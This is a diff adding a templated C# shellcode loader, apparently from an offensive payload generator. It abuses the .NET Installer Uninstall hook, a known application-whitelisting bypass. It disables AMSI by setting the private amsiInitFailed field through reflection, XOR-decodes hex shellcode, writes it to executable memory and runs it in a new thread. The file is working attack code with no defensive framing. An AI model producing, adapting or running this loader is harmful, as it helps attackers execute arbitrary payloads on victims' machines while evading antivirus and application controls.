@@ -1,0 +1,55 @@
+using System;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace {{ v.namespace }} {
+
+    [RunInstaller(true)]
+    public class {{ v.class_name }} : Installer {
+
+        [DllImport("kernel32")]
+        static extern IntPtr {{ v.fn_valloc }}(IntPtr a, uint s, uint t, uint p);
+
+        [DllImport("kernel32")]
+        static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint fl, IntPtr id);
+
+        [DllImport("kernel32")]
+        static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+        static void {{ v.fn_amsi }}() {
+            try {
+                var t = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
+                if (t != null) {
+                    var f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                    if (f != null) f.SetValue(null, true);
+                }
+            } catch {}
+        }
+
+        static byte[] {{ v.fn_hex }}(string h) {
+            var b = new byte[h.Length / 2];
+            for (int i = 0; i < b.Length; i++)
+                b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
+            return b;
+        }
+
+        static byte[] {{ v.fn_xor }}(byte[] d, byte[] k) {
+            var o = new byte[d.Length];
+            for (int i = 0; i < d.Length; i++) o[i] = (byte)(d[i] ^ k[i % k.Length]);
+            return o;
+        }
+
+        public override void Uninstall(System.Collections.IDictionary state) {
+            {{ v.fn_amsi }}();
+
+            byte[] sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
+                                       {{ v.fn_hex }}("{{ key_hex }}"));
+            IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
+            Marshal.Copy(sc, 0, mem, sc.Length);
+            IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(h, 0xFFFFFFFF);
+        }
+    }
+}
